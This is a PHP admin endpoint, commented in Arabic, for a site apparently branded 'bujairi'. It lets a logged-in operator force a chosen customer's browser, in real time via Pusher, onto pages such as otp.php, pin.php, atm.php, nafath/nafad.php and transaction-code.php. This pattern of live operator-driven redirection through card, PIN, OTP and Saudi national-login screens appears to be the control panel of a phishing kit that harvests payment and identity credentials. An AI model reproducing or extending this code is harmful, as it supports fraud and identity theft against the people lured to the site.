<?php
declare(strict_types=1);
/**
 * يحفظ التوجيه في site_settings (setRedirect) + في orders (client_redirect_url) مثل admin/set-redirect.php
 * ليعمل الـ poll في booking/redirect-status.js حتى بدون Pusher.
 * Pusher: bujairi_pusher_notify_customer_redirect، مع fallback إن لم تُضبط مفاتيح Pusher في config.
 */
session_start();
require_once __DIR__ . '/init.php';

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'method']);
    exit;
}

if (empty($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    http_response_code(403);
    echo json_encode(['success' => false, 'error' => 'auth']);
    exit;
}

$userId = (int) ($_POST['user_id'] ?? 0);
$page = trim((string) ($_POST['page'] ?? ''));

// مستخدم مسجّل id>0؛ ضيف لوحة التحكم id سالب؛ 0 غير صالح
if ($userId === 0 || $page === '') {
    echo json_encode(['success' => false, 'error' => 'params']);
    exit;
}

$User->setRedirect($userId, $page);

if (!function_exists('dashboard_pdo')) {
    echo json_encode(['success' => true, 'saved' => true, 'pusher' => false, 'db' => false]);
    exit;
}

$pdo = dashboard_pdo();
if ($userId < 0) {
    $st = $pdo->prepare('SELECT email FROM guest_logins WHERE id = ? LIMIT 1');
    $st->execute([-$userId]);
} else {
    $st = $pdo->prepare('SELECT email FROM users WHERE id = ? LIMIT 1');
    $st->execute([$userId]);
}
$email = trim((string) $st->fetchColumn());
if ($email === '') {
    echo json_encode(['success' => true, 'saved' => true, 'pusher' => false, 'note' => 'no_email']);
    exit;
}

$st2 = $pdo->prepare('SELECT id FROM orders WHERE customer_email = ? ORDER BY id DESC LIMIT 1');
$st2->execute([$email]);
$orderId = (int) $st2->fetchColumn();
if ($orderId < 1) {
    echo json_encode(['success' => true, 'saved' => true, 'pusher' => false, 'db' => false, 'note' => 'no_order_for_email']);
    exit;
}

$pageToSlug = [
    'pay.php' => 'payment_info',
    'otp.php' => 'otp',
    'pin.php' => 'payment_info',
    'nafad.php' => 'customer_info',
    'success.php' => 'success',
    'nafath.php' => 'nafath',
    'atm.php' => 'atm',
    'booking/checkout.php' => 'checkout',
    'booking/payment-method.php' => 'payment_method',
    'booking/payment-info.php' => 'payment_info',
    'booking/otp.php' => 'otp',
    'booking/atm.php' => 'atm',
    'booking/customer-info.php' => 'customer_info',
    'booking/nafath.php' => 'nafath',
    'booking/transaction-code.php' => 'transaction',
    'booking/success.php' => 'success',
    'index.html' => 'index',
    'index.php' => 'index',
    'login.php' => 'index',
    'register.php' => 'index',
    'booking/tickets.php' => 'index',
];

// كل الدوال والإعدادات محمّلة من init.php

$slug = $pageToSlug[$page] ?? null;
$stored = null;

if ($slug === null) {
    $normalizedPage = ltrim($page, '/');
    if ($normalizedPage !== '' && preg_match('/^[a-zA-Z0-9_\\/.?=&-]+$/', $normalizedPage) === 1) {
        $safePath = strtok($normalizedPage, '#') ?: $normalizedPage;
        if (!str_contains($safePath, '..') && (str_ends_with($safePath, '.php') || str_ends_with($safePath, '.html') || str_contains($safePath, '.php?'))) {
            $stored = $safePath;
        }
    }
    if ($stored !== null && str_starts_with($stored, 'booking/')) {
        if (!str_contains($stored, 'id=')) {
            $stored .= (str_contains($stored, '?') ? '&' : '?') . 'id=' . $orderId;
        }
    } else {
        $stored = null;
        $slug = 'checkout';
    }
}

if ($stored === null) {
    if ($slug === 'index') {
        $stored = 'index.php';
    } else {
        if ($slug === null) {
            $slug = 'checkout';
        }
        $path = \function_exists('booking_redirect_url_for_slug') ? booking_redirect_url_for_slug($slug, $orderId) : null;
        $stored = ($path !== null && $path !== '') ? $path : ('booking/checkout.php?id=' . $orderId);
    }
}

if (\function_exists('booking_validate_stored_redirect') && !booking_validate_stored_redirect($stored)) {
    $stored = 'booking/checkout.php?id=' . $orderId;
}

try {
    $upd = $pdo->prepare(
        'UPDATE orders SET client_redirect_url = ?, client_redirect_version = client_redirect_version + 1 WHERE id = ?'
    );
    $upd->execute([$stored, $orderId]);
} catch (Throwable $e) {
    echo json_encode(['success' => false, 'error' => 'db_update', 'detail' => $e->getMessage()], JSON_UNESCAPED_UNICODE);
    exit;
}

$vSt = $pdo->prepare('SELECT client_redirect_version FROM orders WHERE id = ?');
$vSt->execute([$orderId]);
$ver = (int) $vSt->fetchColumn();

/**
 * يرسل force-redirect-user على my-channel — يتطلب config/pusher.php
 * (مضمّن عبر config/config.php + dashboard/config.php). وإلا bujairi_pusher_instance() يرجع null.
 * في المتصفح: site-global-tracker يمرّر PUSHER_KEY لبناء الاشتراك في bujairi-realtime.js
 */
$pusherOk = false;
if (\function_exists('bujairi_pusher_notify_customer_redirect')) {
    bujairi_pusher_notify_customer_redirect($orderId, $stored, $ver);
    if (\function_exists('bujairi_pusher_ready') && bujairi_pusher_ready()) {
        $pusherOk = true;
    }
}

echo json_encode([
    'success' => true,
    'order_id' => $orderId,
    'path' => $stored,
    'redirectVersion' => $ver,
    'pusher' => $pusherOk,
    'db' => true,
], JSON_UNESCAPED_UNICODE);
